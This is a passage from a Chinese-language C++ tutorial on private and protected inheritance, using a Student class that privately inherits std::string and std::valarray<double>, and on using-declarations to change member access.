成员在派生类中仍然是<strong>不可直接访问</strong>的。</li></ul><p><strong>核心思想:</strong></p><p>私有继承意味着派生类<strong>继承了基类的实现</strong>，但<strong>不继承其接口</strong>。基类的公有方法不会成为派生类对象的公有接口的一部分。外部代码不能通过派生类对象直接调用基类的公有方法。派生类内部的成员函数（以及友元）仍然可以访问基类的 <code>public</code> 和 <code>protected</code> 成员（因为它们在派生类内部是 <code>private</code> 的）。</p><p><strong>与公有继承的区别:</strong></p><ul><li>  <strong>关系:</strong> 公有继承是 “is-a”，私有继承是 “is-implemented-in-terms-of”。</li><li>  <strong>接口:</strong> 公有继承继承接口和实现；私有继承只继承实现。</li><li>  <strong>指针/引用转换:</strong> 公有继承下，基类指针/引用可以指向派生类对象；私有继承下，这种隐式转换<strong>不允许</strong>（除非在派生类内部或其友元中）。</li></ul><h3 id="14-2-1-Student-类示例（新版本）"><a href="#14-2-1-Student-类示例（新版本）" class="headerlink" title="14.2.1 Student 类示例（新版本）"></a>14.2.1 Student 类示例（新版本）</h3><p>让我们重新实现 <code>Student</code> 类，这次使用私有继承而不是包含（组合）。<code>Student</code> 类将私有继承自 <code>std::string</code>（用于姓名）和 <code>std::valarray&lt;double&gt;</code>（用于分数）。</p><p><strong>studenti.h (私有继承版本)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> STUDENTI_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STUDENTI_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;valarray&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用私有继承的 Student 类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> :</span> <span class="keyword">private</span> <span class="built_in">std</span>::<span class="built_in">string</span>, <span class="keyword">private</span> <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 私有辅助函数，用于输出分数</span></span><br><span class="line">    <span class="comment">// 注意：现在可以直接访问 valarray 的方法，但它们是私有的</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ostream &amp; <span class="title">arr_out</span><span class="params">(<span class="built_in">std</span>::ostream &amp; os)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="comment">// 需要显式调用基类的构造函数</span></span><br><span class="line">    Student() : <span class="built_in">std</span>::<span class="built_in">string</span>(<span class="string">&quot;Null Student&quot;</span>), <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt;() &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Student</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s)</span></span></span><br><span class="line">        : std::string(s), std::valarray&lt;double&gt;() &#123;&#125;</span><br><span class="line">    explicit Student(int n) : std::string(&quot;Nully&quot;), std::valarray&lt;double&gt;(n) &#123;&#125;</span><br><span class="line">    Student(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s, <span class="keyword">int</span> n)</span><br><span class="line">        : <span class="built_in">std</span>::<span class="built_in">string</span>(s), <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt;(n) &#123;&#125;</span><br><span class="line">    Student(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s, <span class="keyword">const</span> <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; &amp; a)</span><br><span class="line">        : <span class="built_in">std</span>::<span class="built_in">string</span>(s), <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt;(a) &#123;&#125;</span><br><span class="line">    Student(<span class="keyword">const</span> <span class="keyword">char</span> * str, <span class="keyword">const</span> <span class="keyword">double</span> * pd, <span class="keyword">int</span> n)</span><br><span class="line">        : <span class="built_in">std</span>::<span class="built_in">string</span>(str), <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt;(pd, n) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    ~Student() &#123;&#125; <span class="comment">// 析构函数 (默认即可)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问器 - 需要自己提供接口，不能直接用基类的</span></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">Average</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="keyword">double</span> &amp; <span class="keyword">operator</span>[](<span class="keyword">int</span> i);</span><br><span class="line">    <span class="keyword">double</span> <span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span>;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; <span class="title">Name</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// 提供访问姓名的接口</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 友元函数 - 用于输入输出</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::istream &amp; <span class="keyword">operator</span>&gt;&gt;(<span class="built_in">std</span>::istream &amp; is, Student &amp; stu);</span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="built_in">std</span>::istream &amp; <span class="title">getline</span><span class="params">(<span class="built_in">std</span>::istream &amp; is, Student &amp; stu)</span></span>;</span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> Student &amp; stu);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// STUDENTI_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>studenti.cpp (实现)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;studenti.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::ostream;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::istream;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::valarray;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 公有方法实现</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Student::Average</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 可以访问 valarray 的 public 方法 (在 Student 内部是 private)</span></span><br><span class="line">    <span class="keyword">if</span> (valarray&lt;<span class="keyword">double</span>&gt;::size() &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> valarray&lt;<span class="keyword">double</span>&gt;::sum() / valarray&lt;<span class="keyword">double</span>&gt;::size();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="built_in">string</span> &amp; <span class="title">Student::Name</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 可以访问 string 的 public 方法 (在 Student 内部是 private)</span></span><br><span class="line">    <span class="comment">// 需要强制类型转换回基类类型来调用</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">const</span> <span class="built_in">string</span> &amp;) *<span class="keyword">this</span>; <span class="comment">// 将 *this 转换为对基类 string 的引用</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 [] 访问分数</span></span><br><span class="line"><span class="keyword">double</span> &amp; Student::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) &#123;</span><br><span class="line">    <span class="comment">// 可以访问 valarray 的 public 方法 (在 Student 内部是 private)</span></span><br><span class="line">    <span class="comment">// 需要强制类型转换回基类类型来调用</span></span><br><span class="line">    <span class="keyword">return</span> valarray&lt;<span class="keyword">double</span>&gt;::<span class="keyword">operator</span>[](i); <span class="comment">// 或者 ((valarray&lt;double&gt; &amp;)*this)[i];</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> Student::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valarray&lt;<span class="keyword">double</span>&gt;::<span class="keyword">operator</span>[](i); <span class="comment">// 或者 ((const valarray&lt;double&gt; &amp;)*this)[i];</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 私有方法实现</span></span><br><span class="line"><span class="function">ostream &amp; <span class="title">Student::arr_out</span><span class="params">(ostream &amp; os)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> lim = valarray&lt;<span class="keyword">double</span>&gt;::size();</span><br><span class="line">    <span class="keyword">if</span> (lim &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; lim; i++) &#123;</span><br><span class="line">            os &lt;&lt; <span class="keyword">operator</span>[](i) &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 使用 Student::operator[]</span></span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">5</span> == <span class="number">4</span>)</span><br><span class="line">                os &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">5</span> != <span class="number">0</span>)</span><br><span class="line">            os &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        os &lt;&lt; <span class="string">&quot; empty array &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 友元函数实现</span></span><br><span class="line"><span class="comment">// 友元可以访问派生类的私有成员，包括继承来的私有成员（原基类的公有/保护成员）</span></span><br><span class="line">istream &amp; <span class="keyword">operator</span>&gt;&gt;(istream &amp; is, Student &amp; stu) &#123;</span><br><span class="line">    <span class="comment">// 直接访问继承来的 string 部分 (现在是 stu 的私有部分)</span></span><br><span class="line">    is &gt;&gt; (<span class="built_in">string</span> &amp;)stu; <span class="comment">// 需要类型转换</span></span><br><span class="line">    <span class="keyword">return</span> is;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">istream &amp; <span class="title">getline</span><span class="params">(istream &amp; is, Student &amp; stu)</span> </span>&#123;</span><br><span class="line">    getline(is, (<span class="built_in">string</span> &amp;)stu); <span class="comment">// 需要类型转换</span></span><br><span class="line">    <span class="keyword">return</span> is;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ostream &amp; <span class="keyword">operator</span>&lt;&lt;(ostream &amp; os, <span class="keyword">const</span> Student &amp; stu) &#123;</span><br><span class="line">    os &lt;&lt; <span class="string">&quot;Scores for &quot;</span> &lt;&lt; (<span class="keyword">const</span> <span class="built_in">string</span> &amp;) stu &lt;&lt; <span class="string">&quot;:\n&quot;</span>; <span class="comment">// 需要类型转换</span></span><br><span class="line">    stu.arr_out(os); <span class="comment">// 调用私有辅助函数</span></span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用示例 (use_stui.cpp)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;studenti.h&quot;</span> <span class="comment">// 使用私有继承版本</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(Student &amp; sa, <span class="keyword">int</span> n)</span></span>; <span class="comment">// 函数原型 (同之前)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> pupils = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> quizzes = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Student ada[pupils] = &#123;Student(quizzes), Student(quizzes), Student(quizzes)&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pupils; ++i)</span><br><span class="line">        <span class="built_in">set</span>(ada[i], quizzes);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nStudent List:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pupils; ++i)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; ada[i].Name() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 调用 Student 提供的 Name() 接口</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nResults:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pupils; ++i) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; ada[i]; <span class="comment">// 调用 Student 的 operator&lt;&lt;</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;average: &quot;</span> &lt;&lt; ada[i].Average() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 调用 Student 的 Average()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无法直接访问基类方法</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; ada[0].size(); // 错误！valarray::size() 在 Student 中是 private</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; ada[0].length(); // 错误！string::length() 在 Student 中是 private</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无法将派生类指针隐式转换为基类指针</span></span><br><span class="line">    <span class="comment">// string * pstr = &amp;ada[0]; // 错误！</span></span><br><span class="line">    <span class="comment">// valarray&lt;double&gt; * pva = &amp;ada[0]; // 错误！</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Done.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set 函数定义 (同之前)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(Student &amp; sa, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please enter the student&#x27;s name: &quot;</span>;</span><br><span class="line">    getline(<span class="built_in">cin</span>, sa); <span class="comment">// 使用友元 getline</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please enter &quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot; quiz scores:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; sa[i]; <span class="comment">// 使用 Student::operator[]</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span>.get() != <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码说明:</strong></p><ul><li>  <code>Student</code> 类通过私有继承获得了 <code>string</code> 和 <code>valarray&lt;double&gt;</code> 的所有实现。</li><li>  构造函数通过初始化列表调用基类的构造函数。</li><li>  由于基类的公有方法在 <code>Student</code> 中变为私有，<code>Student</code> 类必须提供自己的公有接口（如 <code>Average()</code>, <code>Name()</code>, <code>operator[]</code>）来暴露所需的功能。</li><li>  在 <code>Student</code> 的成员函数或友元函数内部，需要通过<strong>显式类型转换</strong>（如 <code>(const string &amp;) *this</code> 或 <code>valarray&lt;double&gt;::sum()</code>）来调用继承来的基类方法（因为它们现在是 <code>Student</code> 的私有成员）。</li><li>  外部代码不能直接访问继承来的基类方法，也不能将 <code>Student</code> 对象隐式转换为 <code>string</code> 或 <code>valarray&lt;double&gt;</code>。</li></ul><h3 id="14-2-2-使用包含还是私有继承"><a href="#14-2-2-使用包含还是私有继承" class="headerlink" title="14.2.2 使用包含还是私有继承"></a>14.2.2 使用包含还是私有继承</h3><p>对于 “has-a” 或 “is-implemented-in-terms-of” 的关系，我们既可以使用<strong>包含 (组合)**，也可以使用</strong>私有继承**。那么如何选择呢？</p><p><strong>通常推荐使用包含 (组合):</strong></p><ul><li>  <strong>更清晰:</strong> 明确表示 “has-a” 关系，代码更易于理解。<code>Student</code> 类包含一个 <code>name</code> 成员和一个 <code>scores</code> 成员，这很直观。</li><li>  <strong>更简单:</strong> 不需要处理继承带来的复杂性（如访问控制变化、构造函数调用链、名称冲突等）。</li><li><strong>更灵活:</strong><ul><li>  可以轻松包含<strong>多个</strong>同类型的成员对象（例如，一个学生可以有家庭住址和学校住址两个 <code>string</code> 成员）。私有继承通常只能继承一个基类一次（虽然多重继承是可能的，但更复杂）。</li><li>  可以包含指向对象的指针或引用，实现更松散的耦合。</li></ul></li><li>  <strong>封装性更好:</strong> 包含类只能通过成员对象的公有接口与其交互，不会意外地依赖其实现细节（除非成员对象本身封装不佳）。</li></ul><p><strong>私有继承的可能优势 (相对少见):</strong></p><ul><li>  <strong>访问 <code>protected</code> 成员:</strong> 如果派生类需要访问基类的 <code>protected</code> 成员（数据或函数），私有继承提供了这种能力，而包含则不行（除非通过友元）。</li><li>  <strong>覆盖虚函数:</strong> 如果需要覆盖基类的虚函数（即使是私有继承，基类的虚函数在派生类中仍然是虚函数，只是访问权限变为 <code>private</code>），私有继承是必要的。这在使用策略模式或模板方法模式的某些变体时可能有用，但较为高级。</li><li>  <strong>空基类优化 (EBO - Empty Base Optimization):</strong> 在某些情况下，如果基类是空的（没有非静态数据成员），编译器可能优化掉基类子对象占用的空间，使得私有继承的对象比包含同样空类成员的对象更小。但这通常是微优化，不应作为主要选择依据。</li></ul><p><strong>结论:</strong> 对于大多数 “has-a” 关系，**优先选择包含 (组合)**。只有在需要访问基类的 <code>protected</code> 成员或覆盖其虚函数等特殊情况下，才考虑使用私有继承。</p><h3 id="14-2-3-保护继承"><a href="#14-2-3-保护继承" class="headerlink" title="14.2.3 保护继承"></a>14.2.3 保护继承</h3><p>除了 <code>public</code> 和 <code>private</code> 继承，还有**保护继承 (<code>protected</code>)**。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DerivedClassName</span> :</span> <span class="keyword">protected</span> BaseClassName &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>访问规则:</strong></p><p>当一个类保护继承自基类时：</p><ul><li>  基类的 <code>public</code> 成员在派生类中变为 **<code>protected</code>**。</li><li>  基类的 <code>protected</code> 成员在派生类中变为 **<code>protected</code>**。</li><li>  基类的 <code>private</code> 成员在派生类中仍然是<strong>不可直接访问</strong>的。</li></ul><p><strong>特点:</strong></p><ul><li>  与私有继承类似，它也是一种实现继承，不继承接口。外部代码不能访问继承来的成员。</li><li>  与私有继承不同的是，基类的公有和保护成员在派生类中是 <code>protected</code> 的，这意味着<strong>后续从该派生类继承的类</strong>仍然可以访问这些成员。而在私有继承下，这些成员在派生类中变为 <code>private</code>，后续的派生类就无法访问了。</li></ul><p><strong>用途:</strong> 保护继承非常少见。它主要用于一种特殊情况：你想让基类的实现对外部隐藏，但又希望后续的派生类能够访问这些实现。</p><h3 id="14-2-4-使用-using-重新定义访问权限"><a href="#14-2-4-使用-using-重新定义访问权限" class="headerlink" title="14.2.4 使用 using 重新定义访问权限"></a>14.2.4 使用 <code>using</code> 重新定义访问权限</h3><p>有时，在使用私有或保护继承时，我们可能希望将基类的<strong>某个</strong>特定成员恢复其原始的访问权限（或使其变为 <code>public</code>），而不是让它在派生类中保持 <code>private</code> 或 <code>protected</code>。可以使用 <code>using</code> 声明来实现这一点。</p><p><strong>语法:</strong></p><p>在派生类的定义中（通常放在 <code>public</code> 或 <code>protected</code> 部分），使用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> BaseClassName::MemberName;</span><br></pre></td></tr></table></figure><p>这会将 <code>BaseClassName</code> 中的 <code>MemberName</code>（可以是数据成员、成员函数、甚至重载的一组函数）引入到派生类的作用域，并使其具有 <code>using</code> 声明所在区域的访问权限（如果在 <code>public</code> 下，就变为 <code>public</code>；如果在 <code>protected</code> 下，就变为 <code>protected</code>）。</p><p><strong>示例 (修改 <code>Student</code> 类):</strong></p><p>假设我们希望 <code>Student</code> 类（私有继承版本）能够直接使用 <code>valarray</code> 的 <code>size()</code> 和 <code>sum()</code> 方法，就像它们是 <code>Student</code> 的公有方法一样。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// studenti.h (修改后)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> :</span> <span class="keyword">private</span> <span class="built_in">std</span>::<span class="built_in">string</span>, <span class="keyword">private</span> <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ostream &amp; <span class="title">arr_out</span><span class="params">(<span class="built_in">std</span>::ostream &amp; os)</span> <span class="keyword">const</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... 构造函数 ...</span></span><br><span class="line">    ~Student() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 using 声明将基类的部分成员暴露为 public</span></span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt;::size; <span class="comment">// 使 valarray::size() 成为 Student 的 public 成员</span></span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt;::<span class="keyword">operator</span>[]; <span class="comment">// 使 valarray::operator[] 成为 Student 的 public 成员</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仍然需要提供自己的接口，或者暴露更多基类成员</span></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">Average</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; <span class="title">Name</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="comment">// operator[] 现在通过 using 声明暴露了，可以移除 Student 自己的版本 (如果签名匹配)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... 友元 ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// studenti.cpp (修改后)</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Student::Average</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 现在可以直接调用 size() 和 sum() (如果 sum 也 using 了)</span></span><br><span class="line">    <span class="keyword">if</span> (size() &gt; <span class="number">0</span>) <span class="comment">// 直接调用继承来的 size()</span></span><br><span class="line">        <span class="comment">// return sum() / size(); // 假设 sum() 也 using 了</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt;::sum() / size(); <span class="comment">// 或者仍然显式调用</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// operator[] 的实现可以移除了，因为 using 声明提供了它</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... 其他实现可能也需要调整 ...</span></span><br></pre></td></tr></table></figure><p><strong>注意:</strong> <code>using</code> 声明只改变成员的<strong>可访问性</strong>，不改变其继承属性（例如，虚函数仍然是虚函数）。它不能用来降低访问权限（例如，不能在 <code>private</code> 部分 <code>using</code> 一个基类的 <code>public</code> 